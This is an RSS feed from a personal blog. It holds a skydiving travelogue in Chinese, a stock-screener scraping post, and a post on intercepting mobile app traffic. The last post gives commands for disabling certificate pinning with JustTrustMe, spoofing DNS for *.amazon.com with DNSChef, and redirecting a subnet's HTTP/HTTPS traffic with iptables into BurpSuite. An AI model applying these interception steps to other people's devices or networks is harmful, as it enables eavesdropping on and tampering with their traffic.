<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mountaineer YHZ&#39;s blog</title>
  
  <subtitle>This is a personal blog along with other stuff.</subtitle>
  <link href="/rss.xml" rel="self"/>
  
  <link href="https://recursively.github.io/"/>
  <updated>2019-10-08T14:51:10.889Z</updated>
  <id>https://recursively.github.io/</id>
  
  <author>
    <name>recursively.z@gmail.com</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Skydive at Mission Beach</title>
    <link href="https://recursively.github.io/2019/10/08/Skydive-at-Mission-Beach/"/>
    <id>https://recursively.github.io/2019/10/08/Skydive-at-Mission-Beach/</id>
    <published>2019-10-08T15:31:21.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h3 id="心生想法"><a href="#心生想法" class="headerlink" title="心生想法"></a>心生想法</h3><p>跳伞在TODO list上已经躺了很久了，对于跳伞的憧憬从很小很小的时候就开始了，自从最开始在电视上看人跳伞就觉得这是我向往的运动。所幸澳大利亚得益于得天独厚的环境，正是一块跳伞胜地。这次去澳大利亚自驾游可以顺带跳伞，或者说是去跳伞顺带自驾？<br>做个决定挺容易，临近跳伞的那几天逐渐开始焦虑，我做梦都在想绳索会在什么时候断开，要是伞包没扣紧飞了怎么办？以自由落体220km/h的速度接触海面用什么姿势能最小化受力面，同时解决海水深度不够缓冲不足的问题？脑补了一万种硬着陆的方式。<br>我们选择的跳伞地点是凯恩斯的Mission Beach，一大早从酒店出来还下雨，去海滩的一路上还担心跳伞因为天气原因取消了，所幸到了海滩阳光明媚。和我们一同前往的一车人大多数是亚洲面孔，主要是中国人和韩国人，还有几个澳大利亚本地的人。这次跳伞的体验总体来说还不赖。起初只是预定了跳伞的坑位，但是并不知道能不能预定到第三方的拍摄，也就是他们口中的“camera man”，会有另一个摄影师在空中跟拍，效果特别棒，这个通常来说很抢手，基本不可能留给临时打算预约的人，一趟飞机也只能满足一位乘客的这种拍摄需求。跟我们一趟车的一个澳大利亚本地姑娘就是提前预定的这个选项。我在临近跳伞的那几天也挺郁闷的，心想预约不到“camera man”那真是巨大的遗憾啊，我本身是有严重的强迫症，一旦不及自己的预期就会郁闷很长时间。但是在营地现场我看到售票员在介绍各种拍摄内容，然后我就去问了一下能不能预约“camera man”，她说没问题，她可以给我安排，在我还满头雾水的时候，幸福突然降临，我愣了几秒。她说没问题的话就可以登记付款了，然后安排妥当。我一下回过神来，那还用说，当然没问题啊！没等她把话说完我赶紧把卡拿出来塞给她，瞬间心情大好。</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-1.jpg" alt></p><p>在我的教练给我穿装备的时候，他问我感觉怎样，我说很好，有点紧张罢了，他说“why？？”，然后拖着一个意味深长的表情，值得一提的是我看到这表情立马就轻松了许多，从他这表情里能看出异于常人的自信，遂觉稳了。后来我在降落伞打开后问他跳了多少次了，他说有几千次了，对于他们这种每天跳伞次数比上厕所次数还多的人来说，这种运动只是轻轻松松的享受罢了。这些教练都挺幽默亲切的，我们坐车从营地到机场的路上，我坐副驾驶位，开车的老头（50岁左右？）也是个话痨，还吓唬我说他们的飞机是没有舱门的，我不吃这套，whatever，坐门口的反正不是我。车子快到机场的时候教练开始各自检查自己的装备，想反悔这也是最后的机会，上了飞机就没有退路了。上飞机之前camera man跟我说了一大堆关于“give me five”之类的话，在飞机巨大的引擎声音下我大概听清楚了三分之二，反正到时候临场发挥就是了。准确地说这是个camera woman，在上车前我还奇怪这个长相甜美，声音同样甜美的妹子是跟我们去干嘛的，你能想象她现在居然要爬到飞机外面拍摄视频。。。</p><h3 id="Big-jump"><a href="#Big-jump" class="headerlink" title="Big jump"></a>Big jump</h3><p>话不多说，一行人听从教练的指示上了飞机。起飞之前飞机舱门是开着的，直到飞机在跑道上加速的时候舱门也是开着的！就感受着强大的气流在舱门口呼啸而过！我猜在这种气压差下人是很容易被吸出去的。我不知道坐门口的中国妹子为什么如此淡定，而且门口连个扶手都没有，我刚开始只是静静地坐在自己的位子上，看到这架势立马开始找可以拽的东西，还好我左前方就有一个。这种小飞机不同于平时坐的客机，爬升的坡度特别陡，在短短几分钟之内就要上升到15000英尺的高空。我原本以为在这个高度视野广阔的条件下能够看到地球的曲率，就像图片里这样，真实情况是完全看不到，只是广角镜头的缘故。</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-2.jpeg" alt></p><p>令我诧异的是不止我一个人，同飞机的人貌似都很淡定。看着飞机穿过那一片片的云层，心里就越发平静。教练问我感觉怎么样，大概是想舒缓一下我的紧张情绪，然后跟我介绍远方的大堡礁、热带雨林，美不胜收。接着我身后的教练喊了一声”one hundred！“，过了一会儿门口的教练就把飞机舱门打开了。我的个老天，一个不小心就会被外面强大的气流给带出去，尽管当时有28摄氏度左右，在这个高度也感觉凉飕飕的。然后就眼看着门口那一排陆续跳下去了，轮到我的时候我心里没有一点起伏，没有丝毫犹豫，直接就坐在舱门口用脚勾着舱门下方，教练让我把头尽量往他肩膀上靠，所以我整个人就像一个瘫痪的病人一样和教练一起滚了下去。在从舱门口往下跳的这个阶段他们跳伞俱乐部称之为“Big jump”，对于跳伞新手来说这无疑是至暗时刻。坐在舱门口是需要勇气的，为了给教练挪位置，此时几乎半个身子已经悬在机舱外了。不过我个人认为“Big jump”是最酷的部分。这里放一个特写镜头</p><iframe width="560" height="315" src="https://www.youtube.com/embed/644HZh7PgM8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h3 id="Free-fall"><a href="#Free-fall" class="headerlink" title="Free fall"></a>Free fall</h3><p>跳下去的那一瞬间感觉很奇妙，不是我想象中的那种失重感，很刺激，同时又很稳，这辈子是第一次体验这种没有束缚的自由落体的感觉，纯粹的无拘无束，完全不同于过山车跳楼机。整个跳伞过程中最美好的阶段也莫过于“Free fall”阶段，小时候在电视上看别人高空跳伞很多人在空中排成各种各样的造型，我一直都非常期待有一天能体验这种感觉。失重感只发生在下落的前几秒，当达到自由落体最大速度后便没有失重感了，处于匀速下落过程。在这个高度是无法根据地面物体来判断自己的高度的，只能依靠高度计，如果身边没有云层之类的东西作参照几乎察觉不到自己在以极高的速度逼近地面。美好的时光总是短暂的，整个“Free fall”也不过1分钟左右，甚至还没来得及放空大脑去慢慢感受。<br>开伞的时候会有略微失重的感觉，不过是很短暂的。在天上翱翔的短短几分钟，我觉得人类是如此幸运，这个星球给予人类的阳光、空气、海洋、地心引力，这一切造就了跳伞这种独一无二的运动。借这次澳大利亚之行也结识了不少新朋友，一位跟我们同一架飞机跳伞的妹子，是来澳洲找同学玩的，首先是只身前往凯恩斯跳伞，实在是勇气可嘉。</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-3.jpg" alt></p><p>还有一位在国内认识的妹子也是去澳洲找同学玩的，原本打算有机会的话在澳洲一起组队自驾，后来路线错开了，她也在别的海滩完成了跳伞。（PS：两位妹子的照片都是经过了别人的同意才敢往外放的）</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-4.jpg" alt></p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/7-5.png" alt></p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>事实上我并不敢说因为自己经历了一次跳伞便有了没什么大不了的心态，以后任何人叫我再来几遍都无所畏惧。我对于跳伞依旧或多或少持不确定的态度，直到我对这个领域足够了解。更重要的是，这次经历很大程度上塑造或者说强化了我的一些人生观。<br>Btw，在跟澳大利亚人交谈的过程中，从他们的字里行间能读出他们对于自然的热爱，对自然的尊敬。下至海底的腔肠动物，哪怕再低等的生物都能在这里得到尊敬。没有谁能够凌驾于谁之上，这或许是澳大利亚人与大自然相处的哲学吧。”There are always things above you.”</p><p>最后放上自己剪辑的全过程视频</p><iframe width="560" height="315" src="https://www.youtube.com/embed/G9dt75WQujQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
    
    <summary type="html">
    
      对于这次在Mission Beach的跳伞行动可以说是一时冲动下的产物，没有策划，毫无准备。在日期临近的时候才顿觉自己貌似做了个疯狂的决定，用小伙伴的话说就是扛住压力，硬上。。
    
    </summary>
    
    
      <category term="Life" scheme="https://recursively.github.io/categories/Life/"/>
    
    
      <category term="Outdoor" scheme="https://recursively.github.io/tags/Outdoor/"/>
    
  </entry>
  
  <entry>
    <title>A Quantitative Trading Model with Stock Screener</title>
    <link href="https://recursively.github.io/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/"/>
    <id>https://recursively.github.io/2019/08/08/A-Quantitative-Trading-Model-with-Stock-Screener/</id>
    <published>2019-08-08T14:04:27.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Select-the-key-elements-to-make-decision"><a href="#Select-the-key-elements-to-make-decision" class="headerlink" title="Select the key elements to make decision"></a>Select the key elements to make decision</h2><p>Here I choose 5 elements including roe, gross profit margin, liabilities, net profit cash flow, payout ratio to analyze stocks. The reason is not within the scope of this post. Finding out all of these data by hand will be a huge work and will be time-consuming. There exists some better ways to speed up this process. Of course, this is the purpose of my writing this post.<br>The stocks we will analyze mainly sold in many different stock markets, such as Shanghai Stock Exchange, Shenzhen Stock Exchange, Hong Kong Exchange, NASDAQ, New York Stock Exchange, American Stock Exchange, etc. We should filter the qualified stocks judged by the important elements we choose. There are a couple of methods to achieve that. This trading model doesn’t contain complicated calculation and most of the work can be done by stock screener sites and tools like excel.<br>There are tons of stock screeners on the Internet. The first thing is to select a useful one, it depends on yourself. </p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-1.png" alt></p><center>https://www.tradingview.com/screener/</center><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-2.png" alt></p><center>https://finance.yahoo.com/screener/</center><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-3.png" alt></p><center>https://www.investing.com/stock-screener/</center><p>You may need to grab Details of some information from many different sites. For instance, the dividend payout ratio can be found at <a href="https://finbox.com/" target="_blank" rel="noopener">https://finbox.com/</a>, and you even need to pay for the data at other sites. For Apple:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-4.png" alt></p><center>https://finbox.com/AAPL/explorer/payout_ratio</center><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-5.png" alt></p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/6-6.png" alt></p><center>https://finance.yahoo.com/quote/AAPL/key-statistics/</center><p>Maybe some sites can be crawled by simple spiders. But most of the requests sent by the spiders will be banned by those sites. Of course, if we add some additional measures we can bypass those tricks. To deal with the interception of high-frequency requests, the easiest way is to set a time delay. Besides, you can even modify the header to pretend the real requests generated by the browsers. For JavaScript encrypted contents, you can read the code and find out your bypass ways. That will be a little bit troublesome. There are other tools like selenium, phantomjs, puppeteer to handle it. And Puppeteer will be a good choice in most situations, it also provides a python module named pyppeteer.</p><h2 id="Be-careful-with-pyppeteer"><a href="#Be-careful-with-pyppeteer" class="headerlink" title="Be careful with pyppeteer"></a>Be careful with pyppeteer</h2><p>The current version of pyppeteer is not stable, it comes from the limitation of python, some asynchronous methods cannot be used in pyppeteer. And I spent considerable time on those confusing problems. For the exception thrown by pyppeteer:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyppeteer.errors.NetworkError: Protocol Error (Runtime.callFunctionOn): Session closed. Most likely the page has been closed.</span><br></pre></td></tr></table></figure><p>The proposal offered in <a href="https://github.com/miyakogi/pyppeteer/pull/160/files" target="_blank" rel="noopener">https://github.com/miyakogi/pyppeteer/pull/160/files</a> might be useful, but it doesn’t merge to the latest version, you need to modify the pyppeteer source code by yourself.<br>Sometimes the browser will crash because of small memory space, especially in a container like Docker or something like CI environment. What you want to do is to launch the browser with some arguments like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch(&#123;<span class="string">'args'</span>: [<span class="string">'--disable-dev-shm-usage'</span>]&#125;)</span><br></pre></td></tr></table></figure><p>The toughest problem I have encountered during the programming is the browser will always be stuck at <em>page.goto</em> step, finally the browser will be closed automatically. I guess the program might have triggered some scripts that will keep running and never come to an end to deal with the headless browsers. This is a big problem and I’m struggling on it from days to days. In the JavaScript version, puppeteer provides a couple of ways to stop the page loading and return all of the content. But I found a good way to implement the same function in the end, to use finally expression. </p><p>Take a look at the source code of <em>page.goto</em>, this method will raise an exception when it reaches the timeout limit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_createTimeoutPromise</span><span class="params">(self)</span> -&gt; Awaitable[<span class="keyword">None</span>]:</span></span><br><span class="line">    self._maximumTimer = self._loop.create_future()</span><br><span class="line">    <span class="keyword">if</span> self._timeout:</span><br><span class="line">        errorMessage = <span class="string">f'Navigation Timeout Exceeded: <span class="subst">&#123;self._timeout&#125;</span> ms exceeded.'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">_timeout_func</span><span class="params">()</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(self._timeout / <span class="number">1000</span>)</span><br><span class="line">            self._maximumTimer.set_exception(TimeoutError(errorMessage))</span><br><span class="line"></span><br><span class="line">        self._timeout_timer: Union[asyncio.Task, asyncio.Future] = self._loop.create_task(_timeout_func())</span><br></pre></td></tr></table></figure><p>Our goal is to handle this exception and stop it from shutting down the program. It can be solved in such an easy way, so funny.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch()</span><br><span class="line">page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">await</span> page.goto(url, timeout=<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>The key to the problem is to stop the browser from closing. It may be not so convenient, but it’s robust enough to guarantee the necessary content can be completely fetched without shutting down.</p><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>The source code can be found at <a href="https://github.com/recursively/quantitative_trading_pub" target="_blank" rel="noopener">https://github.com/recursively/quantitative_trading_pub</a>. If you select the American stock market, the final output will be like this:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">德州仪器 TXN</span><br><span class="line">ROE: [57.73 35.39 35.21 29.37 26.62]</span><br><span class="line">cashflow_profit：[1.44 1.47 1.28 1.46 1.29]</span><br><span class="line">gross_profit：[65.11 64.26 61.63 58.15 56.93]</span><br><span class="line">debt_ratio：[47.52 41.41 36.26 38.72 40.19]</span><br><span class="line">bonus_ratio：[0.45860215 0.57088539 0.4581363  0.48392498 0.47075505]</span><br><span class="line"></span><br><span class="line">迪士尼 DIS</span><br><span class="line">ROE: [27.97 21.23 21.39 18.73 16.6 ]</span><br><span class="line">cashflow_profit：[1.3  1.36 1.4  1.37 1.13]</span><br><span class="line">gross_profit：[44.94 45.04 46.09 45.94 45.88]</span><br><span class="line">debt_ratio：[45.28 51.82 48.58 44.82 42.74]</span><br><span class="line">bonus_ratio：[0.20400064 0.28028953 0.26067511 0.26604629 0.25996534]</span><br><span class="line"></span><br><span class="line">赛灵思 XLNX</span><br><span class="line">ROE: [21.18 24.42 21.18 24.17 22.06]</span><br><span class="line">cashflow_profit：[1.28 1.25 1.35 1.5  1.6 ]</span><br><span class="line">gross_profit：[70.21 69.85 69.65 70.18 68.8 ]</span><br><span class="line">debt_ratio：[53.36 47.07 45.99 46.19 44.66]</span><br><span class="line">bonus_ratio：[0.70898438 0.55216693 0.59891107 0.48765432 0.47460317]</span><br></pre></td></tr></table></figure><p>The program will calculate the appropriate price, the result below is from HKEX.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IGG 00799       Stock code: HK.00799 Last price:     5.75 gprice:     9.81</span><br></pre></td></tr></table></figure><h2 id="More-to-mention"><a href="#More-to-mention" class="headerlink" title="More to mention"></a>More to mention</h2><p>Some implement in the source code needs to be modified to improve the performance. There are too many IO operations in the program, some functions can be replaced by the asynchronous method. Such as the <em>extract_bonus</em> function:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_bonus</span><span class="params">(self, stock_code)</span>:</span></span><br><span class="line">        res = requests.get(self.bonus_url.format(stock_code), headers=config.headers)</span><br><span class="line">        root = etree.HTML(res.content)</span><br><span class="line">        years = root.xpath(<span class="string">'//*[@id="bonus_table"]/tbody/tr[*]/td[1]/text()'</span>)</span><br><span class="line">        index = []</span><br><span class="line">        recent_ratio = []</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> enumerate(years):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"年报"</span> <span class="keyword">in</span> val:</span><br><span class="line">                index.append(idx)</span><br><span class="line"></span><br><span class="line">        ratio = root.xpath(<span class="string">'//*[@id="bonus_table"]/tbody/tr[*]/td[9]/text()'</span>)</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> enumerate(index):</span><br><span class="line">            <span class="keyword">if</span> idx &lt; <span class="number">5</span>:</span><br><span class="line">                recent_ratio.append(ratio[val])</span><br></pre></td></tr></table></figure><p>Moreover, the browser just requests a single page for every launch. It wastes too much time during the whole procedure. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">extract_debts</span><span class="params">(self, stock_code)</span>:</span></span><br><span class="line">        browser = <span class="keyword">await</span> launch(&#123;<span class="string">'headless'</span>: <span class="literal">True</span>, <span class="string">'args'</span>: [<span class="string">'--disable-dev-shm-usage'</span>]&#125;)</span><br><span class="line">        page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> page.goto(self.debt_url.format(stock_code), &#123;<span class="string">'waitUntil'</span>: <span class="string">"networkidle2"</span>&#125;, timeout=<span class="number">60000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.waitForSelector(<span class="string">'#cwzbTable'</span>)</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#cwzbTable &gt; div.scroll_container &gt; ul &gt; li:nth-child(2) &gt; a'</span>)</span><br><span class="line"></span><br><span class="line">        all_targets = <span class="keyword">await</span> page.xpath(<span class="string">'//*[@id="cwzbTable"]/div[1]/div[1]/div[4]/table[2]/tbody/tr[11]/td[position()&lt;6]'</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> all_targets:</span><br><span class="line">            self.debt_ratio.append(<span class="keyword">await</span> (<span class="keyword">await</span> item.getProperty(<span class="string">'textContent'</span>)).jsonValue())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br></pre></td></tr></table></figure><p>It can be replaced by requesting every page from a new tab instead of restarting the browser.</p>]]></content>
    
    <summary type="html">
    
      This is a model that gathers some important information to decide which stock to buy. Certainly, the transaction can be made by the program itself automatically.
    
    </summary>
    
    
      <category term="Trading" scheme="https://recursively.github.io/categories/Trading/"/>
    
    
      <category term="Python" scheme="https://recursively.github.io/tags/Python/"/>
    
      <category term="Crawler" scheme="https://recursively.github.io/tags/Crawler/"/>
    
      <category term="Quantitative trading" scheme="https://recursively.github.io/tags/Quantitative-trading/"/>
    
  </entry>
  
  <entry>
    <title>Get Network Traffic of Mobile APPs</title>
    <link href="https://recursively.github.io/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/"/>
    <id>https://recursively.github.io/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/</id>
    <published>2019-04-11T10:07:18.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="About-proxies"><a href="#About-proxies" class="headerlink" title="About proxies"></a>About proxies</h2><p>Proxy is generally used to perform a man-in-the-middle attack. But not to just perform the pure MITM attack, it’s convenient to view, analyze and modify the data flow generated by the APPs with a proxy. It’s getting difficult to catch the network traffic on mobile and I’m here to talk about the proposals.</p><h2 id="Methods-to-do-that"><a href="#Methods-to-do-that" class="headerlink" title="Methods to do that"></a>Methods to do that</h2><p>There are 4 methods listed below, and there are certainly other methods exist in this world, but they’re beyond the scope of this post.</p><ul><li><h3 id="Just-simply-use-proxy"><a href="#Just-simply-use-proxy" class="headerlink" title="Just simply use proxy"></a>Just simply use proxy</h3></li></ul><p>It’s simple, just get into the settings and set the proxy and port to your own server, and it’s done.</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-1.png" alt></p><p>This is recommended for most users, but it doesn’t work if the APP doesn’t allow system proxy. </p><ul><li><h3 id="use-the-JustTrustMe-module-of-Xposed-Only-available-for-Android"><a href="#use-the-JustTrustMe-module-of-Xposed-Only-available-for-Android" class="headerlink" title="use the JustTrustMe module of Xposed(Only available for Android)"></a>use the JustTrustMe module of Xposed(Only available for Android)</h3></li></ul><p>Xposed is a framework used to hook functions in android and JustTrustMe is a module disables SSL certificate checking. (<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="noopener">https://github.com/Fuzion24/JustTrustMe</a>)<br>It aims at solving the HTTPS proxy problem. It’s a powerful tool if you want to view the network traffic of APPs which does certificate pinning.<br>Download Xposed installer(<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">https://repo.xposed.info/module/de.robv.android.xposed.installer</a>) and get it installed on your android device. The JustTrustMe binary can be downloaded from <a href="https://github.com/Fuzion24/JustTrustMe/releases/latest" target="_blank" rel="noopener">https://github.com/Fuzion24/JustTrustMe/releases/latest</a>, Then install it:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install ./JustTrustMe.apk</span><br></pre></td></tr></table></figure><p>You can now find that JustTrustMe exists in your Xposed modules.</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-2.png" alt></p><ul><li><h3 id="Setting-up-your-own-DNS-server"><a href="#Setting-up-your-own-DNS-server" class="headerlink" title="Setting up your own DNS server"></a>Setting up your own DNS server</h3></li></ul><p>This is a little bit tricky, it’s briefly illustrated below:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-6.png" alt></p><p>An elegant tool used here is DNSChef. (<a href="https://github.com/iphelix/dnschef" target="_blank" rel="noopener">https://github.com/iphelix/dnschef</a>) , modify the <em>dnschef.ini</em> file to adapt to your needs and configure the nameserver and the listening interface. The content changed here is the A records.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.amazon.com=10.1.3.210</span><br></pre></td></tr></table></figure><p>Start up a DNSChef server:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnschef.py --file=dnschef.ini --nameservers=8.8.8.8 --interface=127.0.0.1</span><br></pre></td></tr></table></figure><p>If you’re using APPs within an android virtual machine, remember to change the nameserver of the network adapter you’re using to the loopback interface, then all the DNS requests to your machine will resend to DNSChef.</p><p>Open listeners in BurpSuite:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-7.png" alt></p><p>Find out the target IP of your requested hosts so that BurpSuite can follow the DNS resolution.</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-5.png" alt></p><p>Assuming that you send a request to <em><a href="http://www.amazon.com" target="_blank" rel="noopener">www.amazon.com</a></em> you can get ordinary responses like this:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-4.png" alt></p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-3.png" alt></p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-8.png" alt></p><ul><li><h3 id="Forward-traffic-of-the-router"><a href="#Forward-traffic-of-the-router" class="headerlink" title="Forward traffic of the router"></a>Forward traffic of the router</h3></li></ul><p>It just does simple traffic forwarding between devices, the problem of SSL certificate pinning should be handled by other tools.<br>If you are using a router which allows forwarding ports in GUI, that will be much easier. And you can also install firmware into your router, OpenWrt is one of the choices. OpenWrt Project is a Linux operating system targeting embedded devices and you can execute shell directives on your router with it.</p><p>For ports forwarding:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253  -p tcp --dport 80 -j DNAT --to-destination 10.1.3.254:80</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 80 -j MASQUERADE</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253  -p tcp --dport 443 -j DNAT --to-destination 10.1.3.254:443</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 443 -j MASQUERADE</span><br></pre></td></tr></table></figure><p>This directive will forward all the network traffic of ip 10.1.3.1~10.1.3.253 at port 80, 443 to ip 10.1.3.254 at port 80, 443.</p><p>Make it clear:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-9.png" alt></p><p>Open the BurpSuite listeners:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-10.png" alt></p><p>All that network traffic can be sent directly or through a proxy like mitmproxy(<a href="https://github.com/mitmproxy/mitmproxy" target="_blank" rel="noopener">https://github.com/mitmproxy/mitmproxy</a>) listened at port 9010, it’s necessary if you would like to make some changes to the packets.</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/4-11.png" alt></p><h2 id="What-else"><a href="#What-else" class="headerlink" title="What else?"></a>What else?</h2><p>Those proposals mentioned above can handle almost 90% of the situations we will encounter. If it doesn’t work, some tools work at IP based network may be helpful, such as bettercap.(<a href="https://github.com/bettercap/bettercap" target="_blank" rel="noopener">https://github.com/bettercap/bettercap</a>)</p>]]></content>
    
    <summary type="html">
    
      This post is to talk about proposals for the mobile proxy problem. The network traffic of mobile APPs can be generally forwarded via system proxy. But what if it doesn&#39;t work?
    
    </summary>
    
    
      <category term="Hacking" scheme="https://recursively.github.io/categories/Hacking/"/>
    
    
      <category term="MITM" scheme="https://recursively.github.io/tags/MITM/"/>
    
  </entry>
  
  <entry>
    <title>Pointer Manipulations That Should Be Noted</title>
    <link href="https://recursively.github.io/2019/02/12/Pointer-Manipulations-That-Should-be-Noted/"/>
    <id>https://recursively.github.io/2019/02/12/Pointer-Manipulations-That-Should-be-Noted/</id>
    <published>2019-02-12T15:02:09.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
